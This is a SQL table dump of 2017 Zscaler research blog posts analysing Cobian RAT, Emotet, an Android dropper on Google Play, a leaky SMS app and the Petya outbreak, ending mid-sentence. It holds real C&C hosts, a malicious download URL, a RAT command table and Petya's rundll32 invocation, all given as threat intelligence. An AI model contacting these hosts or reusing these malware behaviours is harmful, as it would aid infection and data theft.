INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (56, 'Cobian RAT – A backdoored RAT', 'Abhaykant Yadav,', 'August 31, 2017', 'Introduction\r\n\r\nThe Zscaler ThreatLabZ research team has been monitoring a new remote access Trojan (RAT) family called Cobian RAT since February 2017. The RAT builder for this family was first advertised on multiple underground forums where cybercriminals often buy and sell exploit and malware kits. This RAT builder caught our attention as it was being offered for free and had lot of similarities to the njRAT/H-Worm family, which we analyzed in this report.\r\n\r\n   \r\n\r\n   Figure 1: Cobian RAT command-and-control server application\r\n\r\nAs shown in Figure 1, the Cobian RAT control panel and features are similar to that of njRAT and H-Worm. It is noteworthy that the author identified njRAT as the “theme.”\r\n\r\nCrowdsourcing botnet model?\r\n\r\nAs we analyzed the builder, we noticed a particularly interesting function: the builder kit is injected with a backdoor module which retrieves C&C information from a predetermined URL (pastebin) that is controlled by the original author. This allows the original author to control the systems infected by the malware payloads that were generated using this backdoored builder kit.\r\n\r\n\r\n\r\nFigure 2 (click to enlarge): Crowdsourced botnet model – Cobian RAT\r\n\r\nAs shown in Figure 2, the original author of the RAT builder kit is relying on second-level operators to build the RAT payload and spread infections. Then, thanks to the backdoor module, the original author can take full control of infected systems across all the Cobian RAT botnets in which the operators used the backdoored builder kit. The original author can also change the C&C server information configured by the second-level operators.\r\n\r\nEvading detection by malware operator\r\n\r\nDuring our analysis, we observed that when the machine name and username of the systems running the Cobian RAT payload (bot client) and the control server (bot C&C server) are the same, the backdoor module will not be activated and no communication will be sent to the backdoor C&C server.\r\n\r\nThe original author of the RAT builder is assuming that there will be some testing performed by the second-level operators and that they will mostly likely use the same system for both bot client and server applications (C&C server of 127.0.0.1). To hide the presence of the backdoor module, there will be no traffic generated from the bot client to the backdoor C&C server in this case.\r\n\r\nRecent in-the-wild Cobian RAT payload analysis\r\n\r\nWe saw a unique Cobian RAT payload hit our Cloud Sandbox from a Pakistan-based defense and telecommunication solution website (potentially compromised). The executable payload was served inside a ZIP archive and was masquerading as a Microsoft Excel spreadsheet using an embedded icon, as shown in Figure 3.\r\n\r\n  \r\n\r\nFigure 3: Cobian RAT payload masquerading as Microsoft Excel spreadsheet file\r\n\r\nThe executable payload is signed with an invalid digital certificate pretending to be from VideoLAN (Figure 4), creator of the well-known VLC media player.\r\n\r\n   \r\n\r\nFigure 4: Invalid digital certificate pretending to be from VideoLAN\r\n\r\nThe executable file is packed using a .NET packer with the encrypted Cobian RAT payload embedded in the resource section. There is a series of anti-debugging checks performed by this dropper payload before decrypting the RAT and installing it on the victim’s system. The decompiled version of the RAT payload can be seen in Figure 5 below:\r\n\r\n   \r\n\r\nFigure 5: Cobian RAT — unpacked and decompiled\r\n\r\nThe bot’s configuration details are present in Class B’s constructor as shown below:\r\n\r\n   \r\n\r\nFigure 6: Bot configuration details\r\n\r\nThe bot attempts to create a MUTEX using the value of variable “VL” to ensure that only one instance of the bot is running. The bot will proceed to create a copy of itself as %TEMP%/svchost.exe, execute that file, and terminate itself. The newly executed copy will create an autostart registry key to ensure persistence upon system reboot.\r\n\r\nThe bot contains many features that are also present in the njRAT, such as:\r\n\r\n\r\n	Keylogger\r\n	Screen capture\r\n	Webcam\r\n	Voice recorder\r\n	File browser\r\n	Remote command shell\r\n	Dynamic plugins\r\n	Install/Uninstall\r\n\r\n\r\n \r\n\r\nNetwork C&C activity\r\n\r\nThe bot will spawn two threads in the background, one of which will be responsible for ensuring persistence and taking screenshots. The second thread will perform a regular check-in with the remote C&C server. The function “Data” is responsible for parsing the C&C server’s response and executing bot commands on the infected system, which can be seen below:\r\n\r\n   \r\n\r\nFigure 7: Bot “Data” function for parsing C&C response\r\n\r\nThe C&C server address is stored in the configuration function (Figure 6) as a base64 encoded string. The C&C server for the payload that we analyzed pointed to a dynamic DNS domain, swez111.ddns[.]net:20000. Upon successful connection, the bot sends the following request to the C&C server to register the infected system and get further instructions.\r\n\r\nEncrypted Data Sent\r\n\r\nLOGIN|-|SGFja184MDUwMTY=|-|ODc4NDEyQHVzZXI=|-|TWljcm9zb2Z0IFdpbmRvd3MgWFAgUHJvZmVzc2lvbmFs|-|No|-|1.0.40.7|-|Tm90ZXBhZA==|-|U0dGamExODRNRFV3TVRZPSxzd2V6MTExLmRkbnMubmV0LDIwMDAwLHN2Y2hvc3QuZXhlLHtKRjJOTVJBTC00NjcxMzgtUU0yVVRZLVFNMlVUWUhTODd9LFRFTVAsVHJ1ZSxUcnVlLA==|-|2017-07-13\r\n\r\nDecrypted data:\r\n\r\nLOGIN|-|Hack_805016|-|878412@user|-|Microsoft Windows XP Professional|-|No|-|1.0.40.7|-|Notepad|-|SGFja184MDUwMTY=,swez111.ddns.net,20000,svchost.exe,{JF2NMRAL-467138-QM2UTY-QM2UTYHS87},TEMP,True,True,|-|2017-07-13\r\n\r\nPacket Format\r\n\r\nLOGIN|-|BotID|-|Machinename@Username|-|OS|-|CAM|-|RAT Version|-|Installation Data|-|Infection Date\r\n\r\nThe check-in packet includes information about the infected system such as machine name, username, operating system, BotID and configuration data of the payload installed, and the infection date.\r\n\r\nBelow is a complete list of commands that the Cobian RAT supported in the payload we analyzed.\r\n\r\n\r\n	\r\n		\r\n			\r\n			Command\r\n			\r\n			\r\n			 Purpose\r\n			\r\n		\r\n		\r\n			\r\n			Lg\r\n			\r\n			\r\n			Keylogger\r\n			\r\n		\r\n		\r\n			\r\n			Svr|-|@\r\n			\r\n			\r\n			Rename Bot/Campaign ID\r\n			\r\n		\r\n		\r\n			\r\n			Svr|-|!\r\n			\r\n			\r\n			Terminate bot process\r\n			\r\n		\r\n		\r\n			\r\n			Svr|-|#\r\n			\r\n			\r\n			Uninstall Bot\r\n			\r\n		\r\n		\r\n			\r\n			Svr|-|~\r\n			\r\n			\r\n			Restart Bot\r\n			\r\n		\r\n		\r\n			\r\n			Svr|-|$\r\n			\r\n			\r\n			Update C&C list\r\n			\r\n		\r\n		\r\n			\r\n			FLD\r\n			\r\n			\r\n			Stress Tester (Flood using UDP or TCP Traffic)\r\n			\r\n		\r\n		\r\n			\r\n			Execute\r\n			\r\n			\r\n			Used to run executable or script from local disk or remote URL\r\n			\r\n		\r\n		\r\n			\r\n			Ac\r\n			\r\n			\r\n			Send Active Window Title\r\n			\r\n		\r\n		\r\n			\r\n			Sc\r\n			\r\n			\r\n			Send Screen shot\r\n			\r\n		\r\n		\r\n			\r\n			more|-|FM\r\n			\r\n			\r\n			File Manager\r\n			\r\n		\r\n		\r\n			\r\n			more|-|SM\r\n			\r\n			\r\n			System Manager\r\n			\r\n		\r\n		\r\n			\r\n			more|-|CP\r\n			\r\n			\r\n			Remote Desktop\r\n			\r\n		\r\n		\r\n			\r\n			more|-|CM\r\n			\r\n			\r\n			Remote Webcam\r\n			\r\n		\r\n		\r\n			\r\n			more|-|MC\r\n			\r\n			\r\n			Microphone\r\n			\r\n		\r\n		\r\n			\r\n			more|-|NF\r\n			\r\n			\r\n			Information\r\n			\r\n		\r\n		\r\n			\r\n			more|-|CH\r\n			\r\n			\r\n			Chat\r\n			\r\n		\r\n		\r\n			\r\n			more|-|PS\r\n			\r\n			\r\n			Password Stealer\r\n			\r\n		\r\n		\r\n			\r\n			more|-|PT\r\n			\r\n			\r\n			PassTime (Send message box to infected machine)\r\n			\r\n		\r\n	\r\n\r\n\r\nC&C’s packet format\r\n\r\nCommand|-|subcommand|-|subcommand arguments (optional based on command) |-|command data\r\n\r\nConclusion\r\n\r\nCobian RAT appears to be yet another RAT that is spawned from the leaked njRAT code. It is ironic to see that the second level operators, who are using this kit to spread malware and steal from the end user, are getting duped themselves by the original author. The original author is essentially using a crowdsourced model for building a mega Botnet that leverages the second level operators Botnet.\r\n\r\nZscaler ThreatLabZ is actively monitoring this threat and will continue to ensure coverage for Zscaler customers.\r\n\r\nIndicators of Compromise\r\n\r\nMD5: 94911666a61beb59d2988c4fc7003e5a\r\n\r\nZip File MD5: 7eede7047d3d785db248df0870783637\r\n\r\nSource URL: belkomsolutions[.]com/t/guangzhou%20sonicstar%20electronics%20co%20ltd.zip\r\n\r\nC&C: swez111.ddns[.]net:20000(173.254.223.81)\r\n\r\nFileName: GUANGZHOU SONICSTAR ELECTRONICS CO. LTD.exe\r\n\r\nCompilation timestamp: 2017-07-11 03:53:14\r\n\r\nDigitaly Signed: Vendor /C=FR/L=Paris/O=VideoLAN/CN=VideoLAN\r\n\r\nSigning Date:  11:24 AM 7/14/2017\r\n\r\nZscaler Cloud Sandbox IOCs', 'Malware', 'https://www.zscaler.com/blogs/research/cobian-rat-backdoored-rat');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (57, 'A look at recent Emotet Campaigns - August 2017', 'Jithin Nair', 'August 23, 2017', 'Introduction\r\n\r\n\r\n\r\nEmotet, the credential stealing banking Trojan, was first reported in 2014 when it wreaked havoc in Europe and the United States. The Zscaler Threat Research team has been monitoring the new variant of Emotet since April 2017 and has recently seen a spike in Emotet related spam activity.\r\n\r\n\r\n\r\nEmotet is a multi-component malware which specializes in a multitude of nefarious activities, including stealing credentials from browsers and mail clients, banking theft via Man-in-the-Browser attack, email harvesting and propagation through spam emails from infected systems.\r\n\r\n\r\n\r\n \r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\nFigure 1. Unique new malicious document payloads in last 3 weeks.\r\n\r\n\r\n\r\n \r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\nFigure 2: Geolocations targeted by recent Emotet campaign\r\n\r\n\r\n\r\nDistribution\r\n\r\n\r\n\r\nEmotet is commonly distributed through malicious spam email (malspam) campaigns containing a malicious document file attachment or a link to a malicious URL hosting a JavaScript or a document file, which further downloads and installs the Emotet payload. As reported here, in April Emotet was mainly distributed via JavaScript malspam campaigns, whereas the attackers are now leveraging malicious document files with highly obfuscated macro to serve the emotet payload.\r\n\r\n\r\n\r\nObfuscated VBS macro code contains predetermined URLs with code to download and install Emotet payload on the victim machine. As seen in the de-obfuscated VBS macro code (Figure 3), the downloaded binary is stored in “%Temp%“ directory with random integer value.\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\nFigure 3: De-obfuscated VBS macro code\r\n\r\n\r\n\r\nEmotet Payload\r\n\r\n\r\n\r\nThe downloaded executable is packed with a  custom packer which has encrypted data hiding the Emotet executable and the code to load it. When executed, this data is decrypted in the memory using a custom algorithm involving “Base-64 decode” and “XOR”. A new process is created in suspended mode and the decrypted Emotet binary is written in the address space of this process.\r\n\r\n\r\n\r\n \r\n\r\n\r\n\r\n\r\n\r\n \r\n\r\n\r\n\r\n\r\n\r\nFigure 4: Pseudo code of decryption algorithm used to decrypt Emotet and Code to load it.\r\n\r\n\r\n\r\nWhen control is handed over to the new process, it creates a copy of itself in “C:\\windows\\system32\\” with the filename created by appending two strings from a predetermined set of hard-coded strings (Figure 5). The combination of strings is picked based on “volume serial number” of infected system’s volume.\r\n\r\n\r\n\r\nExample filenames can be seen below:  \r\n\r\n\r\n\r\nlookuprpc.exe\r\n\r\n\r\n\r\nhomeservice.exe\r\n\r\n\r\n\r\nprovidernvidia.exe”\r\n\r\n\r\n\r\nThe malware also creates a system service for the dropped executable.\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\nFigure 5: List of hard-coded strings used for filename\r\n\r\n\r\n\r\nOnce the service is started, CreateTimerQueueTimer Windows API is invoked and it’s Callback function is used to periodically trigger core malicious code that is responsible for communication with the Command & Control (C&C) servers, send collected information, and wait for a commands from the server.\r\n\r\n\r\n\r\nUpon successful infection, Emotet registers the compromised host with the C&C server by sending information such as computer name, CPU architecture and OS version, as well as a list of active processes and whether they were executed with administrator privilege.\r\n\r\n\r\n\r\n \r\n\r\n\r\n\r\n\r\n\r\nFigure 6. Data sent to C&C server upon successful infection\r\n\r\n\r\n\r\nThe malware uses API calls “RtlGetVersion” and “GetNativeSystemInfo” to fetch system information as seen in Figure 6. A “dword” is baked out of values returned by these API calls which contains values: processor architecture, OS type, OS version and Service pack.\r\n\r\n\r\n\r\n \r\n\r\n\r\n\r\n\r\n\r\nFigure 7: Code for collecting system information.\r\n\r\n\r\n\r\nCollected information is encrypted and sent to the C&C server using HTTP POST request with UserAgent “Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)”.\r\n\r\n\r\n\r\nThe malware polls for a new command every 15 minutes and if the C&C server doesn’t reply, it will try to contact the next server from the hard-coded list of server. C&C Server IP addresses are stored in hexadecimal DWORD format followed by port number as seen in Figure 7.\r\n\r\n\r\n\r\n \r\n\r\n\r\n\r\n\r\n\r\nFigure 8: Hard coded list of IP address of C&C servers.\r\n\r\n\r\n\r\nConclusion\r\n\r\n\r\n\r\nEmotet is a multicomponent malware that is known for downloading other malware payloads on the infected hosts. There have been reports of Emotet variants with network spreading features but none of the payloads we are seeing in the recent campaigns have this feature.\r\n\r\n\r\n\r\nZscaler ThreatLabZ is actively monitoring this threat and will continue to ensure coverage for Zscaler customers.\r\n\r\nTechnical Analysis by Manohar Ghule.', 'Malware;Spam', 'https://www.zscaler.com/blogs/research/look-recent-emotet-campaigns-august-2017');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (58, 'Malware on Google Play abusing Accessibility Service', 'Gaurav Shinde', 'August 22, 2017', 'Each day as we track mobile malware payloads, we can see our signatures triggered by various banking Trojans apps. But on August 21, one sample triggered a special alert, because it was shown to be available on Google Play.\r\n\r\nThe name of app is \'Earn Real Money Gift cards\'  (package name: com.moneygift.real.app), and we confirmed it as a variant of a widely known BankBot malware family. As we extended our investigation to the author of this app, we came across a second app uploaded by the same author, entitled \'Bubble Shooter Wild Life\' (package name: com.bubblesooter.wildlife). The payload, however, was not a BankBot; it turned out to be a downloader Trojan that is abusing the Google Play Accessibility Service.\r\n\r\n“Accessibility services should only be used to assist users with disabilities in using Android devices and apps”, according to the Google Android Developer Guide.\r\n\r\nUpon preliminary analysis of \'Bubble Shooter Wild Life\', we were able to confirm it to be malicious and capable of abusing Android\'s Accessibility permission to install additional apps without user\'s permission. The Google Android security team was notified about the two malicious apps on the same day (August 21), while we continued analyzing the payloads.\r\n\r\nPackage Name: com.bubblesooter.wildlife\r\n\r\nMD5: ef652a8813b1fd840da54b0c360df888\r\n\r\nPlay Store Link: play.google.com/store/apps/details?id=com.bubblesooter.wildlife\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			                                                                  Fig. 1: Malicious app Bubble Shooter Wild Life on Play Store\r\n		\r\n	\r\n\r\n\r\nWe found the app was protected using Allatori Obfuscator. Most recent malware families have started using obfuscators, packers, and protectors to hinder analysis from security researchers and malware detection systems. Since most of the code strings were obfuscated, we decided to write a routine to decrypt all the strings and rebuild the APK. Once we got the strings in plain text, the analysis was straightforward.\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			                                                                                Fig. 2: Obfuscated strings\r\n		\r\n	\r\n\r\n\r\n\r\n	\r\n		\r\n			\r\n			 \r\n		\r\n		\r\n			                                                                               Fig. 3: De-Obfuscated Strings\r\n			 \r\n		\r\n	\r\n\r\n\r\nFig.3 shows that the app registers a service, which will be triggered after 1200000 milliseconds — or 20 minutes. This might be one of the reasons why Google Bouncer couldn\'t detect this app.\r\n\r\nDetail workflow:\r\n\r\n\r\n	\r\n	Once the app is started, it asks permission to draw over other apps for the user to play the game.\r\n	\r\n	\r\n	The malicious routine in the background waits for 20 minutes before triggering the malicious service.\r\n	\r\n	\r\n	After 20 minutes, it repeteadly shows system alert disguised as a message from the Android OS (Fig. 4).\r\n	\r\n\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			                                      Fig. 4\r\n		\r\n	\r\n\r\n\r\n4. When the user clicks OK, the malware opens the Accessibility Settings menu, where the user can see that “Google Service” is turned off. What the user sees is actually the malware’s accessibility service designed to mimic a service from Google. (Fig.5)\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			                                       Fig. 5\r\n		\r\n	\r\n\r\n\r\n5. If the user clicks on the “Google Service” menu, it displays a toggle button to activate the service with a description. This is another tactic designed to trick the user by copying Google’s original Privacy & Terms from https://www.google.com/policies/terms.\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			                                       Fig. 6\r\n		\r\n	\r\n\r\n\r\nThe text, which looks to be from Google, is stored in the app itself. (Fig. 7)\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			                                                                                                                   Fig. 7\r\n		\r\n	\r\n\r\n\r\n6. When users try to enable the service, they see the list of services required. Considering the techniques used by the malware author to this point, the user is most likely going to accept these permissions and press OK, giving the Accessibility permission to the malware app. (Fig. 8)\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			                                       Fig. 8\r\n		\r\n	\r\n\r\n\r\n7. As soon as the app gets Accessibility permission, it checks for a /sdcard/Download/app.apk file. However, for some reason in our review, it didn’t download this file. But for the sake of analysis, to see what would have happened if there was an app.apk file in the Download section, we kept a random APK file with the same name at that location. The malware abused the accessibility service to install that APK file automatically. First it tried to install the APK directly, but it turned out that the installation failed because the “Installation from Unknown Sources” was disabled. So, the app itself opened the Settings menu, turned on “Installation from Unknown Source” and then restarted the app.apk installation process. It accepted all the permissions of the app and completed the app installation successfully.\r\n\r\nConclusion\r\n\r\nWe have previously identified numerous instances of malicious apps hiding on Google Play and leveraging techniques like time delays and code obfuscation. However, this app’s abuse of the Google Accessibility service to install additional payloads without user’s permission is unique. While the apps in this analysis are fairly new on Google Play with fewer than 5000 downloads, we are concerned about the increase in the availability of dubious apps in the store. As a first line of defense, we recommend that consumers also increase the caution with which they download apps.', 'Mobile Malware', 'https://www.zscaler.com/blogs/research/malware-google-play-abusing-accessibility-service');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (59, 'Mobile App Wall Of Shame: SMS touch', 'Viral Gandhi', 'August 09, 2017', 'App : SMS touch\r\nPrice : $1.99\r\nCategory : Utility \r\nPlatform : iOS                                    \r\nUpdated : Jul 06, 2015\r\nVersion : 4.5\r\nSize : 16 MB\r\nLanguages: English, Dutch, French, German, Italian, Spanish\r\nSeller: Alco Blom\r\nRated 4+\r\n\r\nBackground:\r\n\r\n                                                                 Fig 1: iTunes page\r\n\r\nSMS touch is a text messaging app that allows you to send an international SMS message over 3G, 4G, or Wi-Fi. It\'s available across 820 mobile networks in 220+ countries for a price far lower than the cost of a regular mobile plan. While most plans would charge upwards of 60 cents for an international SMS message, SMS touch charges a flat rate of 9 cents, without any roaming or international charges, allowing the user to recover the purchase price of the app in fewer than 5 texts.\r\n\r\nCost isn\'t the only reason why users choose the app.  SMS touch is also popular among people, especially kids, that don\'t have cellular plans, as the app allows them to use their iPod touch or other such devices to send text messages in any Wi-Fi zone. However, while SMS touch presents an economical choice for consumers, it still may come at too high a cost. \r\n\r\nRecently our ThreatLabZ team discovered that the app sends customer information and SMS messages over a cleartext network, presenting malicious actors the perfect opportunity to intercept login credentials as well as gain access to messages that may contain private information.\r\n\r\nVulnerability:\r\n\r\nWhen users begin to create an account, they are presented with the following screen.\r\n\r\n                                                                Fig 2: Registration\r\n\r\nOnce the user selects \"Create account,\" the app asks for a username and email address.  \r\n\r\n                                                                Fig 3: Registration\r\n\r\nAfter the user has entered all the registration information, the app creates a request to the server and sends the user’s details. In response to this request, the server sends a PIN to be used for login.\r\n\r\n\r\n\r\n                                Fig 4: Request to server and response with login PIN.\r\n\r\nDuring login, the app automatically supplies the PIN and email to the server as shown below.\r\n\r\n\r\n\r\n                                                                 Fig 5: Login screen\r\n\r\nUpon clicking “Login,” the user\'s ID and PIN are sent to the app’s server in plain text. Observe below.\r\n\r\n  Fig 6: During login, user\'s ID and PIN are sent to the app’s server in plain text\r\n\r\nThe username and password can be easily spoofed by an attacker, given that the information is sent to the server in cleartext.\r\n\r\nThe following image displays the SMS texting screen.\r\n\r\n\r\n\r\n                          Fig 7: Send SMS with text in the app\'s message screen\r\n\r\nOnce the user clicks \"Send,\" the app also sends the SMS content to the server over a cleartext network channel, as shown below.\r\n\r\n\r\n\r\nFig 8: SMS content is sent to the server over a cleartext network channel\r\n\r\n\r\nMany users send sensitive information over SMS, similar to the example shown above. This data can easily be accessed by an outsider simply tapping in to the application’s network. We witnessed such a transaction in the Zscaler cloud with a user of this app. See below.\r\n\r\n\r\n\r\n\r\nFig 9: SMS information sent in cleartext, observable in the Zscaler cloud\r\n\r\nConclusion:\r\n\r\nThe list of mobile applications in Google Play and the iTunes App Store that transmit sensitive information in cleartext continues to grow. In our research report entitled  “Are mobile apps a leaky tap in Enterprise?,” we found that 0.5% of transactions from iOS and 0.3% of transactions from Android platforms have some level of privacy leakage. \r\n\r\nA study by IBM & The Ponemon Institute shows that of 400 companies studied, almost 40 percent do not scan the apps they develop for security vulnerabilities. Of those that do scan their apps before releasing them to market, only 15 percent test them as frequently as they should. And, even more worrisome, 50 percent of those that develop mobile apps do not allocate any budget at all to testing for security vulnerabilities. Thus, leaky apps are created and users of such apps are unaware that their private data is at risk of exposure.\r\n\r\nEven though SMS touch is a paid app, it fails to accommodate standard code security practices. Encryption is absolutely necessary to protect user information and to prevent privacy leakage. \r\n\r\nNote: We reached out to the developer of the SMS touch app about this issue. They were prompt to acknowledge the issue and committed to releasing a patch by the end of this year.', '', 'https://www.zscaler.com/blogs/research/mobile-app-wall-shame-sms-touch');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (60, 'SSL/TLS-based malware attacks', 'Deepen Desai', 'August 02, 2017', 'Whether you call it SSL, TLS, or HTTPS, you’re talking about what has become the single greatest means for harboring the transmission of malware: encryption. Zscaler operates a globally distributed cloud security platform, and we have found that more than half of all internet traffic sent through our cloud is encrypted. Some of that traffic still uses the older Secure Sockets Layer (SSL) protocol, while a higher percentage uses the newer Transport Layer Security (TLS) protocol. Sessions for both are invoked with the “HTTPS” website address prefix in your browser. Because Zscaler examines the contents of all encrypted traffic to detect malicious payloads, we have discovered that encryption is frequently used to mask malware and evade security detection tools. In this security brief, we’ll present some of the statistics and trends that our researchers have compiled regarding major malware families, and we’ll describe actions you can take to protect your organization against these threats.\r\n\r\nThe Rising Use of Encryption for Malware\r\n\r\nEncryption has always been used to protect sensitive data transmitted through the internet, but its use has increased to the point where most traffic today is encrypted. Google reported that by the end of 2016, 80 percent of traffic sent across its properties was encrypted.\r\n\r\nWhile encryption is effective for protecting data, it also is effective for hiding malicious payloads. During 2017, an average of 60 percent of the threats detected in the Zscaler global cloud had been encrypted with SSL/TLS, and we’ve been blocking an average of 600,000 encrypted malicious activities every day. In the last six months, we’ve observed that encrypted malicious content has more than doubled.\r\n\r\nCurrent Trends in Encrypted Malware\r\n\r\n1.  Attack types vary\r\n\r\nAmong the 600,000 encrypted incidents blocked each day by the Zscaler cloud, we have seen a variety of attack types hidden within SSL/TLS packets. They primarily include: \r\n\r\n\r\n	Exploit kits \r\n	Malware\r\n	Adware\r\n	Malware callbacks\r\n\r\n\r\n2.  Web exploits abuse public trust\r\n\r\nCybercriminals continue abusing public trust to accomplish their goals, which are primarily profit driven. For example, the attack type using SSL/TLS-enabled advertising networks injects malicious scripts into legitimate websites. When users visits a legitimate website that serves the infected advertisements, they unwittingly fall prey to malware, which can steal their personal information or corrupt their data.\r\n\r\nCybercriminals are also abusing free SSL/TLS providers. The free certificates enable HTTPS support on the attackers’ malicious domains, allowing them to bypass SSL/TLS integrity checks in web browsers. This configuration also creates problems for organizations that are unable to monitor SSL traffic, as they must rely on less effective techniques like IP and domain blocking in an attempt to identify and block threats delivered from such domains.\r\n\r\nZscaler is currently detecting an average of 10,000 web exploits delivered over SSL/TLS each month.\r\n\r\n3.  Phishing continues to evade network perimeter tools\r\n\r\nHackers are posting phishing pages on legitimate domains that they have compromised. Many of these legitimate sites support SSL/TLS, and there are very few network security solutions that can support inspection of encrypted packets at scale. During 2017, Zscaler has blocked an average of 12,000 phishing attempts per day delivered over SSL/TLS, an increase of 400 percent over 2016.\r\n\r\n4.  Malware families are using SSL/TLS for callback activity\r\n\r\nThe use of encryption has increased the sophistication of callback design. It used to be rare to see SSL/TLS used for command-and-control (C&C) activity. But since encryption is now ubiquitous, attackers have decided to join the party and hide inside encrypted packets. Anonymity services like TOR also help to hide C&C servers. Botnets are also using SSL/TLS more frequently, including the use of self-signed certificates along with the names and corresponding information of real companies. The prevalence of this scheme is on the rise. During 2017, Zscaler has blocked an average of more than 5,000 C&C attempts over SSL/TLS per day.\r\n\r\n5.  Distribution of malware families using encryption for C&C\r\n\r\nC&C communication is a critical function for malware, and cybercriminals are relying on encryption more than ever to hide the implementation of an attack. Figure 1 shows the distribution of malware families using encryption for C&C activity, based on unique, new payloads that have been seen in Zscaler Cloud Sandbox during 2017.', 'Malware', 'https://www.zscaler.com/blogs/research/ssltls-based-malware-attacks');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (61, 'Amazon’s Prime Day Won Shopping on Tuesday', 'Whitney Black', 'July 12, 2017', 'I like to complain about Amazon’s shopping algorithm and how it tries to sell me sunscreen, granola bars, and diapers, as if that’s all I ever buy (more true than I like to admit). But like so many others, I turned out on Prime Day  to see what deals the retail megaloth might have for me.\r\n\r\nI was not alone. In fact, pretty much everyone who went to a shopping site on the Zscaler network on Tuesday went to Amazon.\r\n\r\nAs you can see from the diagram below, Amazon traffic accounted for nearly all the traffic in the shopping category among our 5,000 enterprise customers on Tuesday.\r\n\r\n\r\n\r\nIn fact, it more than doubled it’s own daily average traffic, showing that even among busy professionals, Amazon can get us to click on a great deal.', '', 'https://www.zscaler.com/blogs/research/amazons-prime-day-won-shopping-tuesday');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (62, 'UPDATE: Petya Ransomware Outbreak', 'Deepen Desai', 'June 27, 2017', 'One month after the WannaCry outbreak, we have seen another widespread ransomware outbreak, possibly involving the Petya ransomware family variant. The initial vector has been confirmed to be a compromised software update package from MeDoc.  As we learn more, we will continue to update our blog.       	Businesses from several countries, including Ukraine, India, France, Russia, and Spain, have been impacted by this ransomware outbreak  	   	The malware family involved is purported to be a variant of the Petya ransomware family; however, from our analysis up to this point, we are seeing very little resemblance between this code and previous Petya variants  	   	This ransomware variant is highly virulent and, once it infects a user, it spreads rapidly across a corporate network via SMB  	   	There are reports of the payload using the EternalBlue (MS17-010) exploit when it is not able to spread through a network using the credentials of the logged-in user  	   	The ransomware payload encrypts the Master Boot Record (MBR) of an infected system, making it unusable  	   	The ransomware payload is also using the Windows Management Instrumentation Command-line (WMIC) interface for lateral movement over SMB. This explains why the attack has been successful more than a month after the WannaCry outbreak that leveraged the EternalBlue (MS17-010) exploit, which should have been patched on most systems by now                 Protective Actions      	Apply Microsoft Windows security update MS17-010 and CVE-2017-0199  	Block legacy protocols like SMBv1 on your local network  	Disable WMIC on your local network  	Block connection to ports 135, 139, and 445 on your firewall      How Zscaler Can Help with Preventative Measures     Zscaler had generic signature coverage on one of the payloads involved and added multiple signatures and indicators for blocking other known payloads related to this attack.    Advanced Threat Signatures:      	Win32_ransomware_Petya_116628  	CVE_2017_0199      Inline AV Signatures:      	W32/Petya.VUNZ-1981  	W32/Ransom.Petya.J!Eldorado      Zscaler Cloud Sandbox provides the best line of proactive defense against these evolving ransomware strains. A Cloud Sandbox report for a sample payload run is shown below:            Figure 1: Zscaler Cloud Sandbox report of Petya ransomware         Initial Delivery Vector    The initial infection vector was via a compromised custom software update package delivered over HTTP from MeDoc. The ransomware has a worm component that uses the Windows Management Instrumentation Command-line (WMIC) interface and the MS17-010 (EternalBlue and EternalRomance) exploits to propagate laterally over SMB.        Figure 2: Initial infection and propagation         Technical Analysis of the Payload    We analyzed two unique payloads from this attack, both of which were Windows Dynamic-Link Library (DLL) files. These DLLs have an export function without a name; it is invoked using the ordinal value “#1” as shown below:      	<System32>\\rundll32.exe \"%s\",#1      It is also important to note that these files were recently compiled as shown in the screenshot below:        Figure 3: Recently compiled DLL payload    Once executed, the ransomware payload will perform the following activity on the victim\'s machine:      	There is a check in the ransomware routine to look for an infection marker, which, if found, will terminate the execution. This essentially serves as a killswitch for the ransomware payload, preventing further propagation within the network:      ​​       Infection Marker or Killswitch file => C:\\Windows\\MalwareDLLFileName  where MalwareDLLFileName is the name of main DLL      	  	The malware looks for files with following extension on the user machine and encrypts them:  	             .3ds.7z.accdb.ai.asp.aspx.avhd.back.bak.c.cfg.conf.cpp.cs.ctl.dbf.disk.djvu.doc.docx.dwg.eml.fdb.gz.h.hdd.kdbx.mail.mdb.msg.nrg.ora           The encrypted files will have same extension as before.                        Figure 4: Enumerating files for encryption      	If the user is logged in with administrator privileges, the malware payload will also encrypt the Master Boot Record (MBR) and essentially make the system unusable upon system reboot  	   	  	The malware then creates a scheduled task to reboot the infected system as seen below:  	                               Figure 5: Scheduled task to reboot the system in one hour      	Once the system reboots, the infamous ransom note appears, demanding $300 in Bitcoins  	                          Figure 6: Ransom note      	  	The delay in rebooting the compromised system and showing the ransom note is probably done to provide a complete hour for the spreading module to propagate laterally in the network without any indication to the end user  	  	  	We are still analyzing the propagation module but as previously reported, there is a new propagation vector involving WMIC which is possibly the reason this attack has been successful  	                        Figure 7: Leveraging WMIC for lateral movement      	  	We did not observe any network C&C activity associated with these samples  	      Conclusion    WannaCry started a new era of ransomware variants weaponized with a  mechanism for lateral movement. Petya authors went one step further by adding the WMI interface vector and we expect to see more variants in the coming months. This attack shows the importance of a multilayered security approach, and it highlights the gap that 